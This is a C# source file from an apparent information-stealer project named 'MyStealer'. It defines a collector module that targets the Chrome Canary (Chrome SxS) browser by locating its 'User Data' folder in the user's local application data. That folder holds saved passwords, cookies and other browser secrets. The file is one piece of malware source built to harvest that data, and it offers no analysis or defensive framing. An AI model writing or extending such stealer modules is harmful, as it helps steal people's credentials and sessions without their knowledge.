using System.IO;
using System;

namespace MyStealer.Collectors.Browser.ChromiumBased
{
    public class ChromeSxS : Chromium
    {
        public override string ModuleName => "Chrome SxS";

        public override bool HasProfiles => false;

        protected override string UserDataPath => Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Google", "Chrome SxS", "User Data");
    }
}
